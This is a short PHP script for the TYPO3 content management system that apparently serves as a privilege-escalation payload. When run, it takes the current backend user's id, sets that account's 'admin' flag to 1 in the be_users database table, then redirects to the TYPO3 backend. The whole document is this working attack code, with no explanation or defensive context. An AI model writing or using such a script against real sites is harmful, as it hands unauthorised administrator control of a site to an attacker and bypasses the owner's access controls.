<?php
use \TYPO3\CMS\Core\Utility\GeneralUtility;
use \TYPO3\CMS\Core\Database\ConnectionPool;

$userId = $GLOBALS['BE_USER']->user['uid'];
if (is_numeric($userId)) {
    $connectionPool = GeneralUtility::makeInstance(ConnectionPool::class);
    $queryBuilder = $connectionPool->getConnectionForTable('be_users')->createQueryBuilder();
    $statement = $queryBuilder->update('be_users')->where($queryBuilder->expr()->eq('uid', $userId))->set('admin', 1)->execute();
    sleep(1);
    header('Location: /typo3');
    die();
}
?>
